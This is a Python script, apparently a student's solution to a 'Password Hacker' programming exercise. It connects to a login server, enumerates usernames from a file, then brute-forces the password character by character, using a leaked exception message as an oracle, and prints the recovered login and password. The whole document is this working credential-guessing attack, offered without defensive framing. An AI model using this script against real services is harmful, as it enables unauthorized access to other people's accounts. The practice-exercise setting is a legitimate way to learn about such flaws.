from sys import argv
import socket
import json
from time import perf_counter

options = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
host = argv[1]
port = int(argv[2])
def password_search(log, pass_):
    while True:
        for letter in options:
            message_2 = json.dumps({"login": log, "password": pass_ + letter}).encode()
            client_socket.send(message_2)
            recv_2 = json.loads(client_socket.recv(128).decode())
            if recv_2['result'] == 'Exception happened during login':
                pass_ += letter
            if recv_2['result'] == 'Connection success!':
                print(json.dumps({'login': login, 'password': pass_ + letter}))
                return


with socket.socket() as client_socket:
    client_socket.connect((host, int(argv[2])))
    with open('/Users/antonzemtsov/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r') as f:
        lines = f.read().split('\n')
        password = ''
        for login in lines:
            message = json.dumps({
                "login": login,
                "password": password
            }).encode()
            client_socket.send(message)
            recv = json.loads(client_socket.recv(128).decode())
            if recv == {"result": "Wrong password!"}:
                password_search(login, password)
                break
